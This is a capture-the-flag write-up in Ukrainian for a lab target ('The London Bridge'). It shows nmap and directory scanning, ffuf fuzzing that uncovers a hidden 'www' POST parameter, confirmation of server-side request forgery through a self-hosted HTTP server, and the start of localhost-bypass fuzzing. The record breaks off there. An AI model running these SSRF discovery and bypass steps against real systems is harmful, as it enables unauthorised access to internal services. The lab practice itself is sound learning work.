
# The London Bridge - The London Bridge is falling down.

Складність: Medium

Ціль: 10.114.150.99

## 1. Розвідка (Reconnaissance & Enumeration)

### 1.1. Сканування портів (Nmap):
   Первинне сканування мережі виконано за допомогою nmap для виявлення відкритих портів та сервісів.
```bash
└─$ sudo nmap -sC -sV -p- -vv -oN nmap_result.txt 10.114.150.99
```
   22,8080

![nmap](./img/nmap.png)

### 1.2. Веб-розвідка:

```bash
└─$ feroxbuster -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-lowercase-2.3-medium.txt -u http://10.114.150.99:8080/ -k -t 100 --scan-dir-listings
```

![feroxbuster](./img/feroxbuster.png)

```bash
└─$ curl http://10.114.150.99:8080/gallery
...
</form>
    <!--To devs: Make sure that people can also add images using links-->
</body>
</html>
```

```bash
└─$ curl http://10.114.150.99:8080/dejaview                                                                                                                                                                                                 
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>View Image</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 20px;
            background-color: bisque;
        }
        img {
            max-width: 100%;
            height: auto;
            border-radius: 8px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
        }
    </style>
</head>
<body>
    <h1>View Image</h1>
    <form action="/view_image" method="post">
        <label for="image_url">Enter Image URL:</label><br>
        <input type="text" id="image_url" name="image_url" required><br><br>
        <input type="submit" value="View Image">
    </form>
    

</body>
</html>
```

```bash
└─$ curl -X POST http://10.114.150.99:8080/view_image \ 
> -d "image_url=test.txt"
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>View Image</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 20px;
            background-color: bisque;
        }
        img {
            max-width: 100%;
            height: auto;
            border-radius: 8px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
        }
    </style>
</head>
<body>
    <h1>View Image</h1>
    <form action="/view_image" method="post">
        <label for="image_url">Enter Image URL:</label><br>
        <input type="text" id="image_url" name="image_url" required><br><br>
        <input type="submit" value="View Image">
    </form>
    
    <img src="test.txt" alt="User provided image">


</body>
</html>

└─$ curl -X POST http://10.114.150.99:8080/view_image \
-d "image_url=/upload/04.jpg"
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>View Image</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 20px;
            background-color: bisque;
        }
        img {
            max-width: 100%;
            height: auto;
            border-radius: 8px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
        }
    </style>
</head>
<body>
    <h1>View Image</h1>
    <form action="/view_image" method="post">
        <label for="image_url">Enter Image URL:</label><br>
        <input type="text" id="image_url" name="image_url" required><br><br>
        <input type="submit" value="View Image">
    </form>
    
    <img src="/upload/04.jpg" alt="User provided image">


</body>
</html>
```

```bash
└─$ echo test > test.txt
└─$ python3 -m http.server 80                                   
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

```bash
└─$ curl -X POST http://10.114.150.99:8080/view_image \
> -d "image_url=http://192.168.130.250/test.txt"
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>View Image</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 20px;
            background-color: bisque;
        }
        img {
            max-width: 100%;
            height: auto;
            border-radius: 8px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
        }
    </style>
</head>
<body>
    <h1>View Image</h1>
    <form action="/view_image" method="post">
        <label for="image_url">Enter Image URL:</label><br>
        <input type="text" id="image_url" name="image_url" required><br><br>
        <input type="submit" value="View Image">
    </form>
    
    <img src="http://192.168.130.250/test.txt" alt="User provided image">


</body>
</html>
```

На цьому етапі стало зрозуміло, що видимий параметр `image_url` не реалізує описаний у коментарі функціонал імпорту зображень за URL. Це наштовхнуло на припущення, що під час розробки могли залишитися приховані або застарілі параметри, які більше не використовуються інтерфейсом, але все ще обробляються серверною частиною застосунку. Тому було вирішено провести fuzzing назв POST-параметрів, щоб перевірити наявність прихованої функціональності.


```bash
└─$ ffuf \
-w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-words-lowercase.txt \
-X POST \
-u http://10.114.150.99:8080/view_image \
-H "Content-Type: application/x-www-form-urlencoded" \
-d "FUZZ=/upload/04.jpg" \
-fs 823
```

![ffuf_www.png](./img/ffuf_www.png)

```bash
└─$ python3 -m http.server 80
```

```bash
└─$ curl -X POST http://10.114.150.99:8080/view_image \ 
-d "www=http://192.168.130.250/test.txt"
test
```

```bash
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.112.161.73 - - [23/Jul/2026 12:37:16] "GET /test.txt HTTP/1.1" 200 -
```

```bash
└─$ curl -X POST http://10.114.150.99:8080/view_image \
-d "www=http://127.0.0.1"               
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
<title>403 Forbidden</title>
<h1>Forbidden</h1>
<p>You don&#x27;t have the permission to access the requested resource. It is either read-protected or not readable by the server.</p>
```

Вмкористаю модифікований під порт 8080 список "Localhost bypass" з (https://highon.coffee/blog/ssrf-cheat-sheet/)
```bash
─$ ffuf \
-w localhost8080_bypass.txt \
-X POST \
-u http://10.114.150.99:8080/view_image \
-H "Content-Type: application/x-www-form-urlencoded" \
-d "www=http://FUZZ" \
-fw 27
```

![ffuf_localhost_bypass.png](./img/ffuf_localhost_bypass.png)

